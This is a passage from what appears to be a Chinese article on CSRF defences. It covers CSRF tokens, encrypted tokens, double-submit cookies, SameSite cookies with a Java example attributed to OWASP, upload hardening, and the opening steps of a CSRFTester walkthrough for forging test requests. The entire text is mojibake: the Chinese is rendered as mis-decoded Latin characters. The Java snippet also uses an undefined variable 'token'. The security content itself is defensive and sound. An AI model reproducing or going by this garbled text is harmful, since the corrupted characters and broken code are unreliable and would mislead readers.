‡è¯†ã€‚é€šå¸¸ï¼Œå¼€å‘äººå‘˜åªéœ€ä¸ºå½“å‰ä¼šè¯ç”Ÿæˆä¸€æ¬¡Tokenã€‚åœ¨åˆå§‹ç”Ÿæˆæ­¤Tokenä¹‹åï¼Œè¯¥å€¼å°†å­˜å‚¨åœ¨ä¼šè¯ä¸­ï¼Œå¹¶ç”¨äºæ¯ä¸ªåç»­è¯·æ±‚ï¼Œç›´åˆ°ä¼šè¯è¿‡æœŸã€‚å½“æœ€ç»ˆç”¨æˆ·å‘å‡ºè¯·æ±‚æ—¶ï¼ŒæœåŠ¡å™¨ç«¯å¿…é¡»éªŒè¯è¯·æ±‚ä¸­Tokençš„å­˜åœ¨æ€§å’Œæœ‰æ•ˆæ€§ï¼Œä¸ä¼šè¯ä¸­æ‰¾åˆ°çš„Tokenç›¸æ¯”è¾ƒã€‚å¦‚æœåœ¨è¯·æ±‚ä¸­æ‰¾ä¸åˆ°Tokenï¼Œæˆ–è€…æä¾›çš„å€¼ä¸ä¼šè¯ä¸­çš„å€¼ä¸åŒ¹é…ï¼Œåˆ™åº”ä¸­æ­¢è¯·æ±‚ï¼Œåº”é‡ç½®Tokenå¹¶å°†äº‹ä»¶è®°å½•ä¸ºæ­£åœ¨è¿›è¡Œçš„æ½œåœ¨CSRFæ”»å‡»ã€‚ åˆ†å¸ƒå¼æ ¡éªŒåœ¨å¤§å‹ç½‘ç«™ä¸­ï¼Œä½¿ç”¨Sessionå­˜å‚¨CSRF Tokenä¼šå¸¦æ¥å¾ˆå¤§çš„å‹åŠ›ã€‚è®¿é—®å•å°æœåŠ¡å™¨sessionæ˜¯åŒä¸€ä¸ªã€‚ä½†æ˜¯ç°åœ¨çš„å¤§å‹ç½‘ç«™ä¸­ï¼Œæˆ‘ä»¬çš„æœåŠ¡å™¨é€šå¸¸ä¸æ­¢ä¸€å°ï¼Œå¯èƒ½æ˜¯å‡ åå°ç”šè‡³å‡ ç™¾å°ä¹‹å¤šï¼Œç”šè‡³å¤šä¸ªæœºæˆ¿éƒ½å¯èƒ½åœ¨ä¸åŒçš„çœä»½ï¼Œç”¨æˆ·å‘èµ·çš„HTTPè¯·æ±‚é€šå¸¸è¦ç»è¿‡åƒNgnixä¹‹ç±»çš„è´Ÿè½½å‡è¡¡å™¨ä¹‹åï¼Œå†è·¯ç”±åˆ°å…·ä½“çš„æœåŠ¡å™¨ä¸Šï¼Œç”±äºSessioné»˜è®¤å­˜å‚¨åœ¨å•æœºæœåŠ¡å™¨å†…å­˜ä¸­ï¼Œå› æ­¤åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹åŒä¸€ä¸ªç”¨æˆ·å‘é€çš„å¤šæ¬¡HTTPè¯·æ±‚å¯èƒ½ä¼šå…ˆåè½åˆ°ä¸åŒçš„æœåŠ¡å™¨ä¸Šï¼Œå¯¼è‡´åé¢å‘èµ·çš„HTTPè¯·æ±‚æ— æ³•æ‹¿åˆ°ä¹‹å‰çš„HTTPè¯·æ±‚å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„Sessionæ•°æ®ï¼Œä»è€Œä½¿å¾—Sessionæœºåˆ¶åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹å¤±æ•ˆï¼Œå› æ­¤åœ¨åˆ†å¸ƒå¼é›†ç¾¤ä¸­CSRF Tokenéœ€è¦å­˜å‚¨åœ¨Redisä¹‹ç±»çš„å…¬å…±å­˜å‚¨ç©ºé—´ã€‚ ç”±äºä½¿ç”¨Sessionå­˜å‚¨ï¼Œè¯»å–å’ŒéªŒè¯CSRF Tokenä¼šå¼•èµ·æ¯”è¾ƒå¤§çš„å¤æ‚åº¦å’Œæ€§èƒ½é—®é¢˜ï¼Œç›®å‰å¾ˆå¤šç½‘ç«™é‡‡ç”¨Encrypted Token Patternæ–¹å¼ã€‚è¿™ç§æ–¹æ³•çš„Tokenæ˜¯ä¸€ä¸ªè®¡ç®—å‡ºæ¥çš„ç»“æœï¼Œè€Œééšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²ã€‚è¿™æ ·åœ¨æ ¡éªŒæ—¶æ— éœ€å†å»è¯»å–å­˜å‚¨çš„Tokenï¼Œåªç”¨å†æ¬¡è®¡ç®—ä¸€æ¬¡å³å¯ã€‚ è¿™ç§Tokençš„å€¼é€šå¸¸æ˜¯ä½¿ç”¨UserIDã€æ—¶é—´æˆ³å’Œéšæœºæ•°ï¼Œé€šè¿‡åŠ å¯†çš„æ–¹æ³•ç”Ÿæˆã€‚è¿™æ ·æ—¢å¯ä»¥ä¿è¯åˆ†å¸ƒå¼æœåŠ¡çš„Tokenä¸€è‡´ï¼Œåˆèƒ½ä¿è¯Tokenä¸å®¹æ˜“è¢«ç ´è§£ã€‚ åœ¨tokenè§£å¯†æˆåŠŸä¹‹åï¼ŒæœåŠ¡å™¨å¯ä»¥è®¿é—®è§£æå€¼ï¼ŒTokenä¸­åŒ…å«çš„UserIDå’Œæ—¶é—´æˆ³å°†ä¼šè¢«æ‹¿æ¥è¢«éªŒè¯æœ‰æ•ˆæ€§ï¼Œå°†UserIDä¸å½“å‰ç™»å½•çš„UserIDè¿›è¡Œæ¯”è¾ƒï¼Œå¹¶å°†æ—¶é—´æˆ³ä¸å½“å‰æ—¶é—´è¿›è¡Œæ¯”è¾ƒã€‚ æ€»ç»“Tokenæ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰æ•ˆçš„CSRFé˜²æŠ¤æ–¹æ³•ï¼Œåªè¦é¡µé¢æ²¡æœ‰XSSæ¼æ´æ³„éœ²Tokenï¼Œé‚£ä¹ˆæ¥å£çš„CSRFæ”»å‡»å°±æ— æ³•æˆåŠŸã€‚ ä½†æ˜¯æ­¤æ–¹æ³•çš„å®ç°æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦ç»™æ¯ä¸€ä¸ªé¡µé¢éƒ½å†™å…¥Tokenï¼ˆå‰ç«¯æ— æ³•ä½¿ç”¨çº¯é™æ€é¡µé¢ï¼‰ï¼Œæ¯ä¸€ä¸ªFormåŠAjaxè¯·æ±‚éƒ½æºå¸¦è¿™ä¸ªTokenï¼Œåç«¯å¯¹æ¯ä¸€ä¸ªæ¥å£éƒ½è¿›è¡Œæ ¡éªŒï¼Œå¹¶ä¿è¯é¡µé¢TokenåŠè¯·æ±‚Tokenä¸€è‡´ã€‚è¿™å°±ä½¿å¾—è¿™ä¸ªé˜²æŠ¤ç­–ç•¥ä¸èƒ½åœ¨é€šç”¨çš„æ‹¦æˆªä¸Šç»Ÿä¸€æ‹¦æˆªå¤„ç†ï¼Œè€Œéœ€è¦æ¯ä¸€ä¸ªé¡µé¢å’Œæ¥å£éƒ½æ·»åŠ å¯¹åº”çš„è¾“å‡ºå’Œæ ¡éªŒã€‚è¿™ç§æ–¹æ³•å·¥ä½œé‡å·¨å¤§ï¼Œä¸”æœ‰å¯èƒ½é—æ¼ã€‚ éªŒè¯ç å’Œå¯†ç å…¶å®ä¹Ÿå¯ä»¥èµ·åˆ°CSRF Tokençš„ä½œç”¨å“¦ï¼Œè€Œä¸”æ›´å®‰å…¨ã€‚ ä¸ºä»€ä¹ˆå¾ˆå¤šé“¶è¡Œç­‰ç½‘ç«™ä¼šè¦æ±‚å·²ç»ç™»å½•çš„ç”¨æˆ·åœ¨è½¬è´¦æ—¶å†æ¬¡è¾“å…¥å¯†ç ï¼Œç°åœ¨æ˜¯ä¸æ˜¯æœ‰ä¸€å®šé“ç†äº†ï¼Ÿ åŒé‡CookieéªŒè¯åœ¨ä¼šè¯ä¸­å­˜å‚¨CSRF Tokenæ¯”è¾ƒç¹çï¼Œè€Œä¸”ä¸èƒ½åœ¨é€šç”¨çš„æ‹¦æˆªä¸Šç»Ÿä¸€å¤„ç†æ‰€æœ‰çš„æ¥å£ã€‚ é‚£ä¹ˆå¦ä¸€ç§é˜²å¾¡æªæ–½æ˜¯ä½¿ç”¨åŒé‡æäº¤Cookieã€‚åˆ©ç”¨CSRFæ”»å‡»ä¸èƒ½è·å–åˆ°ç”¨æˆ·Cookieçš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥è¦æ±‚Ajaxå’Œè¡¨å•è¯·æ±‚æºå¸¦ä¸€ä¸ªCookieä¸­çš„å€¼ã€‚ åŒé‡Cookieé‡‡ç”¨ä»¥ä¸‹æµç¨‹ï¼š åœ¨ç”¨æˆ·è®¿é—®ç½‘ç«™é¡µé¢æ—¶ï¼Œå‘è¯·æ±‚åŸŸåæ³¨å…¥ä¸€ä¸ªCookieï¼Œå†…å®¹ä¸ºéšæœºå­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚csrfcookie=v8g9e4ksfhwï¼‰ã€‚ åœ¨å‰ç«¯å‘åç«¯å‘èµ·è¯·æ±‚æ—¶ï¼Œå–å‡ºCookieï¼Œå¹¶æ·»åŠ åˆ°URLçš„å‚æ•°ä¸­ï¼ˆæ¥ä¸Šä¾‹POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhwï¼‰ã€‚ åç«¯æ¥å£éªŒè¯Cookieä¸­çš„å­—æ®µä¸URLå‚æ•°ä¸­çš„å­—æ®µæ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´åˆ™æ‹’ç»ã€‚ æ­¤æ–¹æ³•ç›¸å¯¹äºCSRF Tokenå°±ç®€å•äº†è®¸å¤šã€‚å¯ä»¥ç›´æ¥é€šè¿‡å‰åç«¯æ‹¦æˆªçš„çš„æ–¹æ³•è‡ªåŠ¨åŒ–å®ç°ã€‚åç«¯æ ¡éªŒä¹Ÿæ›´åŠ æ–¹ä¾¿ï¼Œåªéœ€è¿›è¡Œè¯·æ±‚ä¸­å­—æ®µçš„å¯¹æ¯”ï¼Œè€Œä¸éœ€è¦å†è¿›è¡ŒæŸ¥è¯¢å’Œå­˜å‚¨Tokenã€‚ å½“ç„¶ï¼Œæ­¤æ–¹æ³•å¹¶æ²¡æœ‰å¤§è§„æ¨¡åº”ç”¨ï¼Œå…¶åœ¨å¤§å‹ç½‘ç«™ä¸Šçš„å®‰å…¨æ€§è¿˜æ˜¯æ²¡æœ‰CSRF Tokené«˜ï¼ŒåŸå› æˆ‘ä»¬ä¸¾ä¾‹è¿›è¡Œè¯´æ˜ã€‚ ç”±äºä»»ä½•è·¨åŸŸéƒ½ä¼šå¯¼è‡´å‰ç«¯æ— æ³•è·å–Cookieä¸­çš„å­—æ®µï¼ˆåŒ…æ‹¬å­åŸŸåä¹‹é—´ï¼‰ï¼Œäºæ˜¯å‘ç”Ÿäº†å¦‚ä¸‹æƒ…å†µï¼š å¦‚æœç”¨æˆ·è®¿é—®çš„ç½‘ç«™ä¸ºwww.a.comï¼Œè€Œåç«¯çš„apiåŸŸåä¸ºapi.a.comã€‚é‚£ä¹ˆåœ¨www.a.comä¸‹ï¼Œå‰ç«¯æ‹¿ä¸åˆ°api.a.comçš„Cookieï¼Œä¹Ÿå°±æ— æ³•å®ŒæˆåŒé‡Cookieè®¤è¯ã€‚ äºæ˜¯è¿™ä¸ªè®¤è¯Cookieå¿…é¡»è¢«ç§åœ¨a.comä¸‹ï¼Œè¿™æ ·æ¯ä¸ªå­åŸŸéƒ½å¯ä»¥è®¿é—®ã€‚ ä»»ä½•ä¸€ä¸ªå­åŸŸéƒ½å¯ä»¥ä¿®æ”¹a.comä¸‹çš„Cookieã€‚ æŸä¸ªå­åŸŸåå­˜åœ¨æ¼æ´è¢«XSSæ”»å‡»ï¼ˆä¾‹å¦‚upload.a.comï¼‰ã€‚è™½ç„¶è¿™ä¸ªå­åŸŸä¸‹å¹¶æ²¡æœ‰ä»€ä¹ˆå€¼å¾—çªƒå–çš„ä¿¡æ¯ã€‚ä½†æ”»å‡»è€…ä¿®æ”¹äº†a.comä¸‹çš„Cookieã€‚ æ”»å‡»è€…å¯ä»¥ç›´æ¥ä½¿ç”¨è‡ªå·±é…ç½®çš„Cookieï¼Œå¯¹XSSä¸­æ‹›çš„ç”¨æˆ·å†å‘www.a.comä¸‹ï¼Œå‘èµ·CSRFæ”»å‡»ã€‚ æ€»ç»“ï¼šç”¨åŒé‡Cookieé˜²å¾¡CSRFçš„ä¼˜ç‚¹ï¼š æ— éœ€ä½¿ç”¨Sessionï¼Œé€‚ç”¨é¢æ›´å¹¿ï¼Œæ˜“äºå®æ–½ã€‚ Tokenå‚¨å­˜äºå®¢æˆ·ç«¯ä¸­ï¼Œä¸ä¼šç»™æœåŠ¡å™¨å¸¦æ¥å‹åŠ›ã€‚ ç›¸å¯¹äºTokenï¼Œå®æ–½æˆæœ¬æ›´ä½ï¼Œå¯ä»¥åœ¨å‰åç«¯ç»Ÿä¸€æ‹¦æˆªæ ¡éªŒï¼Œè€Œä¸éœ€è¦ä¸€ä¸ªä¸ªæ¥å£å’Œé¡µé¢æ·»åŠ ã€‚ ç¼ºç‚¹ï¼š Cookieä¸­å¢åŠ äº†é¢å¤–çš„å­—æ®µã€‚ å¦‚æœæœ‰å…¶ä»–æ¼æ´ï¼ˆä¾‹å¦‚XSSï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥Cookieï¼Œé‚£ä¹ˆè¯¥é˜²å¾¡æ–¹å¼å¤±æ•ˆã€‚ éš¾ä»¥åšåˆ°å­åŸŸåçš„éš”ç¦»ã€‚ ä¸ºäº†ç¡®ä¿Cookieä¼ è¾“å®‰å…¨ï¼Œé‡‡ç”¨è¿™ç§é˜²å¾¡æ–¹å¼çš„æœ€å¥½ç¡®ä¿ç”¨æ•´ç«™HTTPSçš„æ–¹å¼ï¼Œå¦‚æœè¿˜æ²¡åˆ‡HTTPSçš„ä½¿ç”¨è¿™ç§æ–¹å¼ä¹Ÿä¼šæœ‰é£é™©ã€‚ Samesite Cookieå±æ€§é˜²æ­¢CSRFæ”»å‡»çš„åŠæ³•å·²ç»æœ‰ä¸Šé¢çš„é¢„é˜²æªæ–½ã€‚ä¸ºäº†ä»æºå¤´ä¸Šè§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒGoogleèµ·è‰äº†ä¸€ä»½è‰æ¡ˆæ¥æ”¹è¿›HTTPåè®®ï¼Œé‚£å°±æ˜¯ä¸ºSet-Cookieå“åº”å¤´æ–°å¢Samesiteå±æ€§ï¼Œå®ƒç”¨æ¥æ ‡æ˜è¿™ä¸ª Cookieæ˜¯ä¸ªâ€œåŒç«™ Cookieâ€ï¼ŒåŒç«™Cookieåªèƒ½ä½œä¸ºç¬¬ä¸€æ–¹Cookieï¼Œä¸èƒ½ä½œä¸ºç¬¬ä¸‰æ–¹Cookieï¼ŒSamesite æœ‰ä¸¤ä¸ªå±æ€§å€¼ï¼Œåˆ†åˆ«æ˜¯ Strict å’Œ Laxï¼Œä¸‹é¢åˆ†åˆ«è®²è§£ï¼š Samesite=Strictè¿™ç§ç§°ä¸ºä¸¥æ ¼æ¨¡å¼ï¼Œè¡¨æ˜è¿™ä¸ª Cookie åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸å¯èƒ½ä½œä¸ºç¬¬ä¸‰æ–¹ Cookieï¼Œç»æ— ä¾‹å¤–ã€‚æ¯”å¦‚è¯´ b.com è®¾ç½®äº†å¦‚ä¸‹ Cookieï¼š 123Set-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3 æˆ‘ä»¬åœ¨ a.com ä¸‹å‘èµ·å¯¹ b.com çš„ä»»æ„è¯·æ±‚ï¼Œfoo è¿™ä¸ª Cookie éƒ½ä¸ä¼šè¢«åŒ…å«åœ¨ Cookie è¯·æ±‚å¤´ä¸­ï¼Œä½† bar ä¼šã€‚ä¸¾ä¸ªå®é™…çš„ä¾‹å­å°±æ˜¯ï¼Œå‡å¦‚æ·˜å®ç½‘ç«™ç”¨æ¥è¯†åˆ«ç”¨æˆ·ç™»å½•ä¸å¦çš„ Cookie è¢«è®¾ç½®æˆäº† Samesite=Strictï¼Œé‚£ä¹ˆç”¨æˆ·ä»ç™¾åº¦æœç´¢é¡µé¢ç”šè‡³å¤©çŒ«é¡µé¢çš„é“¾æ¥ç‚¹å‡»è¿›å…¥æ·˜å®åï¼Œæ·˜å®éƒ½ä¸ä¼šæ˜¯ç™»å½•çŠ¶æ€ï¼Œå› ä¸ºæ·˜å®çš„æœåŠ¡å™¨ä¸ä¼šæ¥å—åˆ°é‚£ä¸ª Cookieï¼Œå…¶å®ƒç½‘ç«™å‘èµ·çš„å¯¹æ·˜å®çš„ä»»æ„è¯·æ±‚éƒ½ä¸ä¼šå¸¦ä¸Šé‚£ä¸ª Cookieã€‚ Samesite=Laxè¿™ç§ç§°ä¸ºå®½æ¾æ¨¡å¼ï¼Œæ¯” Strict æ”¾å®½äº†ç‚¹é™åˆ¶ï¼šå‡å¦‚è¿™ä¸ªè¯·æ±‚æ˜¯è¿™ç§è¯·æ±‚ï¼ˆæ”¹å˜äº†å½“å‰é¡µé¢æˆ–è€…æ‰“å¼€äº†æ–°é¡µé¢ï¼‰ä¸”åŒæ—¶æ˜¯ä¸ªGETè¯·æ±‚ï¼Œåˆ™è¿™ä¸ªCookieå¯ä»¥ä½œä¸ºç¬¬ä¸‰æ–¹Cookieã€‚æ¯”å¦‚è¯´ b.comè®¾ç½®äº†å¦‚ä¸‹Cookieï¼š 123Set-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3 å½“ç”¨æˆ·ä» a.com ç‚¹å‡»é“¾æ¥è¿›å…¥ b.com æ—¶ï¼Œfoo è¿™ä¸ª Cookie ä¸ä¼šè¢«åŒ…å«åœ¨ Cookie è¯·æ±‚å¤´ä¸­ï¼Œä½† bar å’Œ baz ä¼šï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨æˆ·åœ¨ä¸åŒç½‘ç«™ä¹‹é—´é€šè¿‡é“¾æ¥è·³è½¬æ˜¯ä¸å—å½±å“äº†ã€‚ä½†å‡å¦‚è¿™ä¸ªè¯·æ±‚æ˜¯ä» a.com å‘èµ·çš„å¯¹ b.com çš„å¼‚æ­¥è¯·æ±‚ï¼Œæˆ–è€…é¡µé¢è·³è½¬æ˜¯é€šè¿‡è¡¨å•çš„ post æäº¤è§¦å‘çš„ï¼Œåˆ™barä¹Ÿä¸ä¼šå‘é€ã€‚ ç”ŸæˆTokenæ”¾åˆ°Cookieä¸­å¹¶ä¸”è®¾ç½®Cookieçš„Samesiteï¼ŒJavaä»£ç å¦‚ä¸‹ï¼š 123456789private void addTokenCookieAndHeader(HttpServletRequest httpRequest, HttpServletResponse httpResponse) &#123; //ç”Ÿæˆtoken String sToken = this.generateToken(); //æ‰‹åŠ¨æ·»åŠ Cookieå®ç°æ”¯æŒâ€œSamesite=strictâ€ //Cookieæ·»åŠ åŒé‡éªŒè¯ String CookieSpec = String.format("%s=%s; Path=%s; HttpOnly; Samesite=Strict", this.determineCookieName(httpRequest), sToken, httpRequest.getRequestURI()); httpResponse.addHeader("Set-Cookie", CookieSpec); httpResponse.setHeader(CSRF_TOKEN_NAME, token); &#125; ä»£ç æºè‡ªOWASP Cross-Site_Request_Forgery #Implementation example æˆ‘ä»¬åº”è¯¥å¦‚ä½•ä½¿ç”¨SamesiteCookieå¦‚æœSamesiteCookieè¢«è®¾ç½®ä¸ºStrictï¼Œæµè§ˆå™¨åœ¨ä»»ä½•è·¨åŸŸè¯·æ±‚ä¸­éƒ½ä¸ä¼šæºå¸¦Cookieï¼Œæ–°æ ‡ç­¾é‡æ–°æ‰“å¼€ä¹Ÿä¸æºå¸¦ï¼Œæ‰€ä»¥è¯´CSRFæ”»å‡»åŸºæœ¬æ²¡æœ‰æœºä¼šã€‚ ä½†æ˜¯è·³è½¬å­åŸŸåæˆ–è€…æ˜¯æ–°æ ‡ç­¾é‡æ–°æ‰“å¼€åˆšç™»é™†çš„ç½‘ç«™ï¼Œä¹‹å‰çš„Cookieéƒ½ä¸ä¼šå­˜åœ¨ã€‚å°¤å…¶æ˜¯æœ‰ç™»å½•çš„ç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ–°æ‰“å¼€ä¸€ä¸ªæ ‡ç­¾è¿›å…¥ï¼Œæˆ–è€…è·³è½¬åˆ°å­åŸŸåçš„ç½‘ç«™ï¼Œéƒ½éœ€è¦é‡æ–°ç™»å½•ã€‚å¯¹äºç”¨æˆ·æ¥è®²ï¼Œå¯èƒ½ä½“éªŒä¸ä¼šå¾ˆå¥½ã€‚ å¦‚æœSamesiteCookieè¢«è®¾ç½®ä¸ºLaxï¼Œé‚£ä¹ˆå…¶ä»–ç½‘ç«™é€šè¿‡é¡µé¢è·³è½¬è¿‡æ¥çš„æ—¶å€™å¯ä»¥ä½¿ç”¨Cookieï¼Œå¯ä»¥ä¿éšœå¤–åŸŸè¿æ¥æ‰“å¼€é¡µé¢æ—¶ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ã€‚ä½†ç›¸åº”çš„ï¼Œå…¶å®‰å…¨æ€§ä¹Ÿæ¯”è¾ƒä½ã€‚ å¦å¤–ä¸€ä¸ªé—®é¢˜æ˜¯Samesiteçš„å…¼å®¹æ€§ä¸æ˜¯å¾ˆå¥½ï¼Œç°é˜¶æ®µé™¤äº†ä»æ–°ç‰ˆChromeå’ŒFirefoxæ”¯æŒä»¥å¤–ï¼ŒSafariä»¥åŠiOS Safariéƒ½è¿˜ä¸æ”¯æŒï¼Œç°é˜¶æ®µçœ‹æ¥æš‚æ—¶è¿˜ä¸èƒ½æ™®åŠã€‚ è€Œä¸”ï¼ŒSamesiteCookieç›®å‰æœ‰ä¸€ä¸ªè‡´å‘½çš„ç¼ºé™·ï¼šä¸æ”¯æŒå­åŸŸã€‚ä¾‹å¦‚ï¼Œç§åœ¨topic.a.comä¸‹çš„Cookieï¼Œå¹¶ä¸èƒ½ä½¿ç”¨a.comä¸‹ç§æ¤çš„SamesiteCookieã€‚è¿™å°±å¯¼è‡´äº†å½“æˆ‘ä»¬ç½‘ç«™æœ‰å¤šä¸ªå­åŸŸåæ—¶ï¼Œä¸èƒ½ä½¿ç”¨SamesiteCookieåœ¨ä¸»åŸŸåå­˜å‚¨ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€‚æ¯ä¸ªå­åŸŸåéƒ½éœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•ä¸€æ¬¡ã€‚ æ€»ä¹‹ï¼ŒSamesiteCookieæ˜¯ä¸€ä¸ªå¯èƒ½æ›¿ä»£åŒæºéªŒè¯çš„æ–¹æ¡ˆï¼Œä½†ç›®å‰è¿˜å¹¶ä¸æˆç†Ÿï¼Œå…¶åº”ç”¨åœºæ™¯æœ‰å¾…è§‚æœ›ã€‚ é˜²æ­¢ç½‘ç«™è¢«åˆ©ç”¨å‰é¢æ‰€è¯´çš„ï¼Œéƒ½æ˜¯è¢«æ”»å‡»çš„ç½‘ç«™å¦‚ä½•åšå¥½é˜²æŠ¤ã€‚è€Œéé˜²æ­¢æ”»å‡»çš„å‘ç”Ÿï¼ŒCSRFçš„æ”»å‡»å¯ä»¥æ¥è‡ªï¼š æ”»å‡»è€…è‡ªå·±çš„ç½‘ç«™ã€‚ æœ‰æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ç½‘ç«™ã€‚ ç¬¬ä¸‰æ–¹è®ºå›ç­‰ç”¨æˆ·å†…å®¹ã€‚ è¢«æ”»å‡»ç½‘ç«™è‡ªå·±çš„è¯„è®ºåŠŸèƒ½ç­‰ã€‚ å¯¹äºæ¥è‡ªé»‘å®¢è‡ªå·±çš„ç½‘ç«™ï¼Œæˆ‘ä»¬æ— æ³•é˜²æŠ¤ã€‚ä½†å¯¹å…¶ä»–æƒ…å†µï¼Œé‚£ä¹ˆå¦‚ä½•é˜²æ­¢è‡ªå·±çš„ç½‘ç«™è¢«åˆ©ç”¨æˆä¸ºæ”»å‡»çš„æºå¤´å‘¢ï¼Ÿ ä¸¥æ ¼ç®¡ç†æ‰€æœ‰çš„ä¸Šä¼ æ¥å£ï¼Œé˜²æ­¢ä»»ä½•é¢„æœŸä¹‹å¤–çš„ä¸Šä¼ å†…å®¹ï¼ˆä¾‹å¦‚HTMLï¼‰ã€‚ æ·»åŠ Header X-Content-Type-Options: nosniff é˜²æ­¢é»‘å®¢ä¸Šä¼ HTMLå†…å®¹çš„èµ„æºï¼ˆä¾‹å¦‚å›¾ç‰‡ï¼‰è¢«è§£æä¸ºç½‘é¡µã€‚ å¯¹äºç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡ï¼Œè¿›è¡Œè½¬å­˜æˆ–è€…æ ¡éªŒã€‚ä¸è¦ç›´æ¥ä½¿ç”¨ç”¨æˆ·å¡«å†™çš„å›¾ç‰‡é“¾æ¥ã€‚ å½“å‰ç”¨æˆ·æ‰“å¼€å…¶ä»–ç”¨æˆ·å¡«å†™çš„é“¾æ¥æ—¶ï¼Œéœ€å‘ŠçŸ¥é£é™©ï¼ˆè¿™ä¹Ÿæ˜¯å¾ˆå¤šè®ºå›ä¸å…è®¸ç›´æ¥åœ¨å†…å®¹ä¸­å‘å¸ƒå¤–åŸŸé“¾æ¥çš„åŸå› ä¹‹ä¸€ï¼Œä¸ä»…ä»…æ˜¯ä¸ºäº†ç”¨æˆ·ç•™å­˜ï¼Œä¹Ÿæœ‰å®‰å…¨è€ƒè™‘ï¼‰ã€‚ CSRFå…¶ä»–é˜²èŒƒæªæ–½å¯¹äºä¸€çº¿çš„ç¨‹åºå‘˜åŒå­¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å„ç§é˜²æŠ¤ç­–ç•¥æ¥é˜²å¾¡CSRFï¼Œå¯¹äºQAã€SREã€å®‰å…¨è´Ÿè´£äººç­‰åŒå­¦ï¼Œæˆ‘ä»¬å¯ä»¥åšå“ªäº›äº‹æƒ…æ¥æå‡å®‰å…¨æ€§å‘¢ï¼Ÿ CSRFæµ‹è¯•CSRFTesteræ˜¯ä¸€æ¬¾CSRFæ¼æ´çš„æµ‹è¯•å·¥å…·ï¼ŒCSRFTesterå·¥å…·çš„æµ‹è¯•åŸç†å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼Œä½¿ç”¨ä»£ç†æŠ“å–æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®è¿‡çš„æ‰€æœ‰çš„è¿æ¥ä»¥åŠæ‰€æœ‰çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé€šè¿‡åœ¨CSRFTesterä¸­ä¿®æ”¹ç›¸åº”çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé‡æ–°æäº¤ï¼Œç›¸å½“äºä¸€æ¬¡ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¦‚æœä¿®æ”¹åçš„æµ‹è¯•è¯·æ±‚æˆåŠŸè¢«ç½‘ç«™æœåŠ¡å™¨æ¥å—ï¼Œåˆ™è¯´æ˜å­˜åœ¨CSRFæ¼æ´ï¼Œå½“ç„¶æ­¤æ¬¾å·¥å…·ä¹Ÿå¯ä»¥è¢«ç”¨æ¥è¿›è¡ŒCSRFæ”»å‡»ã€‚ CSRFTesterä½¿ç”¨æ–¹æ³•å¤§è‡´åˆ†ä¸‹é¢å‡ ä¸ªæ­¥éª¤ï¼š æ­¥éª¤1ï¼šè®¾ç½®æµè§ˆå™¨ä»£ç† CSRFTesteré»˜è®¤ä½¿ç”¨Localhostä¸Šçš„ç«¯å£8008ä½œä¸ºå…¶ä»£ç†ï¼Œå¦‚æœä»£ç†é…ç½®æˆåŠŸï¼ŒCSRFTesterå°†ä¸ºæ‚¨çš„æµè§ˆå™¨ç”Ÿæˆçš„æ‰€æœ‰åç»­HTTPè¯·æ±‚ç”Ÿæˆè°ƒè¯•æ¶ˆæ¯ã€‚ æ­¥éª¤2ï¼šä½¿ç”¨åˆæ³•è´¦æˆ·è®¿é—®ç½‘ç«™å¼€å§‹æµ‹è¯• æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæˆ‘ä»¬æƒ³è¦ä¸ºCSRFæµ‹è¯•çš„ç‰¹å®šä¸šåŠ¡Webé¡µé¢ã€‚æ‰¾åˆ°æ­¤é¡µé¢åï¼Œé€‰æ‹©CSRFTesterä¸­çš„â€œå¼€å§‹å½•åˆ¶â€æŒ‰é’®å¹¶æ‰§è¡Œä¸šåŠ¡åŠŸèƒ½ï¼›å®Œæˆåï¼Œç‚¹å‡»CSRFTesterä¸­çš„â€œåœæ­¢å½•åˆ¶â€æŒ‰é’®ï¼›æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¯¥è½¯ä»¶ä¼šå…¨éƒ¨éå†ä¸€éå½“å‰é¡µé¢çš„æ‰€æœ‰è¯·æ±‚ã€‚ æ­¥éª¤3ï¼šé€šè¿‡CSRFä¿®æ”¹å¹¶ä¼ªé€ è¯·æ±‚ 